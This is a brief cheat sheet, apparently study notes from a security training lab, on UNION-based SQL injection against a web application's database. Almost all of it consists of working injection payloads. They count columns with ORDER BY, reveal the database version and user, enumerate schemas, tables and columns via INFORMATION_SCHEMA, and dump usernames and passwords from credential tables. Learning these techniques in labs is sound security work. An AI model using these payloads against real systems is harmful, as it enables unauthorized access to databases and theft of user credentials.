## Database Enumeration

## Number of columns

### Première methode :
' order by 1-- 
' order by 2-- 
...
' order by 4-- 

Si pas d'erreur à 4 et erreur à 5 -> la table contient 4 colonnes

### Seconde méthode :

cn' UNION select 1,2,3,4-- 

Si pas d'erreur -> la table contient 4 colonnes

cn' UNION select 1,@@version,3,4-- 
cn' UNION select 1,user(),3,4-- 

## DBMS technology

- If the Web server we see in HTTP response is Apache or Nginx, DBMS is most likely MYSQL(Linux).
- If the Web server we see in HTTP response is IIS, DBMS is most likely MSSQL (Windows).

## Databse version

cn' UNION select 1,@@version,3,4-- 

## INFORMATION_SCHEMA : SCHEMATA

The table SCHEMATA in the INFORMATION_SCHEMA database contains information about all databases on the server.

SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -

cn' UNION select 1,database(),2,3-- -

## TABLES :

cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -

## COLUMNS :

cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -

## DATA :

cn' UNION select 1, username, password, 4 from dev.credentials-- -
cn' UNION select 1, username, password, 4 from ilfreight.users-- -